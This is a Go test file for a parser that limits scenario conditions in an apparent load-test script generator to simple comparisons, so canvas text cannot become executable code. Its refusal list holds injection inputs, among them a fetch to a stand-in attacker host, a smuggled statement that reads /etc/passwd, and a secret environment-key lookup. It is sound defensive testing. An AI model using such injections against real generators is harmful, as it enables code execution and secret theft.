package domain

import (
	"encoding/json"
	"errors"
	"os"
	"strings"
	"testing"
)

// What the grammar accepts. Anything a scenario needs to say, and nothing more.
func TestTheGrammarAcceptsWhatAConditionNeeds(t *testing.T) {
	accepted := []string{
		"status == 200",
		"status != 500",
		"count > 0",
		"count >= 10",
		"price < 99.5",
		"price <= 99.5",
		`name == "alice"`,
		"ready",
		"status == 200 && ready",
		"status == 200 || status == 201",
		"(status == 200 || status == 201) && ready",
		"a == 1 && b == 2 && c == 3",
		"total == -5",
	}

	for _, expression := range accepted {
		if _, err := ParseCondition(expression); err != nil {
			t.Errorf("%q was refused: %v", expression, err)
		}
	}
}

// The point of the grammar: an expression is not JavaScript, so a text field on
// the canvas cannot become code that runs inside the generator.
//
// Each line below is something somebody could type to make the script do
// something the scenario never described.
func TestTheGrammarRefusesAnythingThatIsNotAComparison(t *testing.T) {
	refused := map[string]string{
		"a function call":        `fetch("http://attacker.test")`,
		"a second statement":     "status == 200; open('/etc/passwd')",
		"a property lookup":      "__ENV.BALLAST_SECRET_KEY == 1",
		"an assignment":          "status = 200",
		"a template literal":     "`${status}`",
		"a dollar substitution":  "${status}",
		"an arrow function":      "() => 1",
		"a method call":          "status.toString()",
		"an array":               "[1, 2, 3]",
		"an object":              "{ a: 1 }",
		"a comment":              "status == 200 // ignore the rest",
		"a block comment":        "status == 200 /* and more */",
		"a backslash in a value": `name == "a\\"`,
		"an unclosed value":      `name == "alice`,
		"an unclosed group":      "(status == 200",
		"nothing at all":         "",
		"an operator alone":      "&&",
		"a dangling operator":    "status ==",
	}

	for what, expression := range refused {
		_, err := ParseCondition(expression)
		if err == nil {
			t.Errorf("%s was accepted: %q", what, expression)
			continue
		}
		if !errors.Is(err, ErrInvalidCondition) {
			t.Errorf("%s was refused for the wrong reason: %v", what, err)
		}
	}
}

// The tree is what the generator emits from, so it has to say what was meant.
func TestTheTreeSaysWhatWasParsed(t *testing.T) {
	tree, err := ParseCondition(`status == 200 && name == "alice"`)
	if err != nil {
		t.Fatalf("ParseCondition: %v", err)
	}

	if tree.Kind != CondAnd {
		t.Fatalf("the top of the tree is %q, wanted and", tree.Kind)
	}

	left := tree.Left
	if left.Kind != CondCompare || left.Op != "==" {
		t.Fatalf("the left side is %q %q, wanted a == comparison", left.Kind, left.Op)
	}
	if left.Left.Kind != CondVariable || left.Left.Name != "status" {
		t.Fatalf("the left operand is %q %q, wanted the variable status", left.Left.Kind, left.Left.Name)
	}
	if left.Right.Kind != CondNumber || left.Right.Number != 200 {
		t.Fatalf("the right operand is %q %v, wanted the number 200", left.Right.Kind, left.Right.Number)
	}

	right := tree.Right
	if right.Right.Kind != CondString || right.Right.Text != "alice" {
		t.Fatalf("the text value is %q %q, wanted alice", right.Right.Kind, right.Right.Text)
	}
}

// && binds tighter than ||, as everywhere else. A reader of the canvas should
// not have to wonder.
func TestAndBindsTighterThanOr(t *testing.T) {
	tree, err := ParseCondition("a || b && c")
	if err != nil {
		t.Fatalf("ParseCondition: %v", err)
	}

	if tree.Kind != CondOr {
		t.Fatalf("the top of the tree is %q, wanted or", tree.Kind)
	}
	if tree.Right.Kind != CondAnd {
		t.Fatalf("the right side is %q, wanted and", tree.Right.Kind)
	}
}

// The same lists are read by the front end's own copy of the grammar
// (web/src/features/builder/condition.test.ts). Two parsers that are meant to
// agree stay in agreement only if they are asked the same questions: a panel that
// accepted what the server refuses would send somebody to a failed save, and one
// that refused what the server accepts would forbid a scenario that works.
func TestTheSharedCorpusIsAcceptedAndRefusedAsWritten(t *testing.T) {
	raw, err := os.ReadFile("testdata/conditions.json")
	if err != nil {
		t.Fatalf("read the corpus: %v", err)
	}

	var corpus struct {
		Accepted []string `json:"accepted"`
		Refused  []string `json:"refused"`
	}
	if err := json.Unmarshal(raw, &corpus); err != nil {
		t.Fatalf("decode the corpus: %v", err)
	}
	if len(corpus.Accepted) == 0 || len(corpus.Refused) == 0 {
		t.Fatal("the corpus is empty, which would prove nothing")
	}

	for _, expression := range corpus.Accepted {
		if _, err := ParseCondition(expression); err != nil {
			t.Errorf("%q should be accepted: %v", expression, err)
		}
	}
	for _, expression := range corpus.Refused {
		if _, err := ParseCondition(expression); err == nil {
			t.Errorf("%q should be refused", expression)
		}
	}
}

// Two names read the last response. They are not variables a node writes, so a
// node cannot be given either: the first would shadow the status, and an
// assertion on the status would be reading something else without saying so.
func TestTheResponseNamesAreReservedAndReadable(t *testing.T) {
	for _, name := range []string{"response_status", "response_time_ms"} {
		if !IsReservedVariable(name) {
			t.Errorf("%q is not reserved", name)
		}
		if _, err := ParseCondition(name + " > 0"); err != nil {
			t.Errorf("%q cannot be read in a condition: %v", name, err)
		}
	}
	if IsReservedVariable("status") || IsReservedVariable("token") {
		t.Error("an ordinary name is reserved")
	}

	cases := map[string]Node{
		"an extraction":  {ID: "n", Kind: NodeExtractVariable, Variable: "response_status", From: "a"},
		"a set variable": {ID: "n", Kind: NodeSetVariable, Variable: "response_time_ms", Value: "1"},
		"a loop item":    {ID: "n", Kind: NodeLoop, Iterations: 3, Over: "items", Item: "response_status"},
	}
	for what, node := range cases {
		graph := ScenarioGraph{Start: "n", Nodes: []Node{node, {ID: "end", Kind: NodeEnd}}}
		if node.Kind == NodeLoop {
			graph.Nodes = append(graph.Nodes, Node{ID: "body", Kind: NodeThinkTime, Seconds: 1})
			graph.Edges = []Edge{{From: "n", To: "body", When: "body"}, {From: "n", To: "end", When: "after"}, {From: "body", To: "n"}}
		} else {
			graph.Edges = []Edge{{From: "n", To: "end"}}
		}

		err := graph.Validate()
		if !errors.Is(err, ErrInvalidGraph) || !strings.Contains(err.Error(), "reserved") {
			t.Errorf("%s named after the response was accepted or refused for the wrong reason: %v", what, err)
		}
	}
}
